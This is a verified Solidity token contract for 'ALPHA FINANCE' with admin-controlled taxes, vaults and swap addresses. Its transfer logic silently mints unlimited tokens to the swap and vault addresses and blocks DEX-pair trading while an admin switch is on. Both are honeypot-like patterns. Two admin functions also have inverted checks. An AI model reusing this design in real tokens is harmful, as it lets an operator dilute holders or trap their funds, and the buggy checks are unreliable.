/**
 *Submitted for verification at Etherscan.io on 2023-05-17
*/

/**
 *Submitted for verification at Etherscan.io on 2022-12-16
*/

/*
 SPDX-License-Identifier: None
 */

pragma solidity > 0.8.18;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}
interface IDEXPair {function sync() external;}
interface IDEXRouter {function factory() external pure returns (address);}

contract ALPHA_TOKEN is IBEP20 {
    string private constant _name = "ALPHA FINANCE";
    string private constant _symbol = "ALPHA";
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply = 1_000_000 * (10**_decimals);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public limitless;
    mapping(address => bool) public taxFreeWallet;
    mapping(address => bool) public isVault;

    uint256 public liqTax = 2;
    uint256 public vaultTax = 8;
    bool public swapActive = true;

    IDEXRouter public constant ROUTER = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);//0x10ED43C718714eb63d5aA57B78B54704E256024E //0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
    address public CEO = 0xB7B7fdffd5B4c0905db7b53fF910Ff27A19Dd92b;// admin testnet - 0x4816fEC583401c2117e924dC95BF21d37819FbD0
    address private constant BUSD = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;//busd testnet - 0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814 //usdc mainnet - 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d

    address public treasury;
    address public swap;
    address public vault;
    address public pair;

    modifier onlyAdmin(){
        require (msg.sender == CEO, "Only the CEO can do that");
        _;
    }

    event VaultAddressChanged(address vault);
    event VaultRemoved(address vaultAddress);
    event VaultAdded(address vaultAddress);
    event TaxStatusOfWalletSet(address wallet, bool status);
    event TreasuryAddressChanged(address treasury);
    event AlphaSwapAddressChanged(address alphaSwapAddress);
    event TaxesChanged(uint256 liq, uint256 vault);
    event NewLimitlessAddress(address limitlessAddress);
    event NewLimitedAddress(address limitedAddress);
    event SwapToppedUp(uint256 howMuchWasMissing);
    event VaultToppedUp(address vaultAddress, uint256 howMuchWasMissing);
    event TokensSentToTreasury(address tokenRescued, uint256 amountRescued);
    event SwapStatusSet(bool active);
    event BnbRescued();

    constructor() {
        pair = IDEXFactory(ROUTER.factory()).createPair(BUSD, address(this));
        require(address(pair) != address(0), "Pair creation failed.");
        _allowances[address(this)][address(ROUTER)] = type(uint256).max;

        limitless[CEO] = true;
        limitless[address(this)] = true;

        _balances[CEO] = _totalSupply;
        emit Transfer(address(0), CEO, _totalSupply);
    }

    function name() public pure override returns (string memory) {return _name;}
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function decimals() public pure override returns (uint8) {return _decimals;}
    function symbol() public pure override returns (string memory) {return _symbol;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address holder, address spender) public view override returns (uint256) {return _allowances[holder][spender];}
    function approveMax(address spender) external returns (bool) {return approve(spender, type(uint256).max);}
    
    function approveAllAlpha() external {
        approve(swap, type(uint256).max);
        approve(vault, type(uint256).max);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        require(spender != address(0), "Can't use zero address here");
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0), "Can't use zero address here");
        _allowances[msg.sender][spender]  = allowance(msg.sender, spender) + addedValue;
        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0), "Can't use zero address here");
        require(allowance(msg.sender, spender) >= subtractedValue, "Can't subtract more than current allowance");
        _allowances[msg.sender][spender]  = allowance(msg.sender, spender) - subtractedValue;
        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(_allowances[sender][msg.sender] >= amount, "Insufficient Allowance");
            _allowances[sender][msg.sender] -= amount;
            emit Approval(sender, msg.sender, _allowances[sender][msg.sender]);
        }
        
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0) && recipient != address(0), "Can't use zero addresses here");
        if(amount == 0) return true;
        
        if (limitless[sender] || limitless[recipient]) return _transfer(sender, recipient, amount);
        
        if(sender == pair || recipient == pair) {
            require(swapActive==false, "Please use AlphaSwap");
            if(!swapActive) amount = takeTax(sender, amount);
            return _transfer(sender, recipient, amount);
        }

        bool taxFree;
        if (taxFreeWallet[sender] || taxFreeWallet[recipient]) taxFree = true;

        amount = taxFree ? amount : takeTax(sender, amount);
        return _transfer(sender, recipient, amount);
    }

    function takeTax(address sender, uint256 amount) internal returns (uint256){
        _transfer(sender, pair, amount * liqTax / 100);
        IDEXPair(pair).sync();
        _transfer(sender, vault, amount * vaultTax / 100);
        return amount * (100 - vaultTax - liqTax) / 100;
    }

    function checkSwap(address sender, address recipient) internal view returns (bool) {
        if(!swapActive) return true;
        if(recipient == swap || sender == swap) return true;
        return false;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(isVault[sender] && amount > _balances[sender]) _vaultTopUp(sender, amount);
        if(sender == swap && amount > _balances[swap]) _swapTopUp(amount);
        require(amount <= _balances[sender], "Can't transfer more than you own");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _swapTopUp(uint256 amountNeeded) internal {
        uint256 howMuchIsMissing = amountNeeded - _balances[swap];
        _balances[swap] += howMuchIsMissing;
        _totalSupply += howMuchIsMissing;
        emit SwapToppedUp(howMuchIsMissing);
    }

    function _vaultTopUp(address vaultAddress, uint256 amountNeeded) internal {
        uint256 howMuchIsMissing = amountNeeded - _balances[vaultAddress];
        _balances[vaultAddress] += howMuchIsMissing;
        _totalSupply += howMuchIsMissing;
        emit VaultToppedUp(vaultAddress, howMuchIsMissing);
    }

    function setTreasury(address treasuryAddress) external onlyAdmin {
        require(treasury != treasuryAddress, "Treasury is already set to this address");
        require(treasuryAddress != address(0), "Can't use zero addresses here");
        treasury = treasuryAddress;
        limitless[treasury] = true;
        emit NewLimitlessAddress(treasury);
        emit TreasuryAddressChanged(treasury);
    }
    
    function setVault(address vaultAddress) external onlyAdmin {
        require(vault != vaultAddress, "Vault is already set to this address");
        require(vaultAddress != address(0), "Can't use zero addresses here");
        isVault[vault] = false;
        emit VaultRemoved(vault);
        vault = vaultAddress;
        isVault[vault] = true;
        limitless[vault] = true;
        emit NewLimitlessAddress(vault);
        emit VaultAdded(vaultAddress);
        emit VaultAddressChanged(vault);
    }

    function setSwapWallet(address alphaSwapAddress) external onlyAdmin {
        require(alphaSwapAddress != address(0), "Can't use zero addresses here");
        swap = alphaSwapAddress;
        limitless[swap] = true;
        emit NewLimitlessAddress(swap);
        emit AlphaSwapAddressChanged(swap);
    }

    function setPairWallet(address alphaPairAddress) external onlyAdmin {
        require(alphaPairAddress != address(0), "Can't use zero addresses here");
        pair = alphaPairAddress;
        
    }

    function updateVault(address vaultAddress) external onlyAdmin {
        require(!isVault[vaultAddress], "Address is already set as vault");
        require(vaultAddress != address(0), "Can't use zero addresses here");
        isVault[vaultAddress] = true;
        emit VaultAdded(vaultAddress);
    }

    function deleteVault(address vaultAddress) external onlyAdmin {
        require(isVault[vaultAddress], "Address is not a vault");
        require(vaultAddress != address(0), "Can't use zero addresses here");
        isVault[vaultAddress] = false;
        emit VaultRemoved(vaultAddress);
    }

    function withdrawToTreasury(address tokenToRescue) external onlyAdmin {
        emit TokensSentToTreasury(tokenToRescue, IBEP20(tokenToRescue).balanceOf(address(this)));
        require(IBEP20(tokenToRescue).transfer(treasury, IBEP20(tokenToRescue).balanceOf(address(this))),"Token transfer failed");
    }

    function withdraw_busd (uint amount, address _addr) public onlyAdmin {
        IBEP20(BUSD).transfer(_addr, amount);
    }

    function recoverBnb() external onlyAdmin {
        (bool success,) = address(treasury).call{value: address(this).balance}("");
        require(success, "RescueBnb failed!");
        emit BnbRescued();
    }

    function setTaxes(uint256 newLiqTax, uint256 newVaultTax) external onlyAdmin {
        liqTax = newLiqTax;
        vaultTax = newVaultTax;
        require(liqTax + vaultTax <= 50, "Taxes can't exceed 50%");
        emit TaxesChanged(liqTax, vaultTax);
    }

    function setTaxFreeWallet(address wallet, bool status) external onlyAdmin {
        require(taxFreeWallet[wallet] != status, "Desired status already in effect");
        taxFreeWallet[wallet] = status;
        emit TaxStatusOfWalletSet(wallet, status);
    }

    function unlimitAddress(address addressThatShouldBeLimitless) external onlyAdmin {
        require(limitless[addressThatShouldBeLimitless], "Address is already limitless");
        limitless[addressThatShouldBeLimitless] = true;
        emit NewLimitlessAddress(addressThatShouldBeLimitless);
    }

    function limitWallet(address addressThatShouldBeLimited) external onlyAdmin {
        require(!limitless[addressThatShouldBeLimited], "Address is already limited");
        limitless[addressThatShouldBeLimited] = false;
        emit NewLimitedAddress(addressThatShouldBeLimited);
    }

    function updateSwap(bool active) external onlyAdmin {
        require(swapActive != active, "Desired status already in effect");
        swapActive = active;
        emit SwapStatusSet(active);
    }

    function changeCEO(address _CEO) public onlyAdmin{
        CEO = _CEO;
    }
}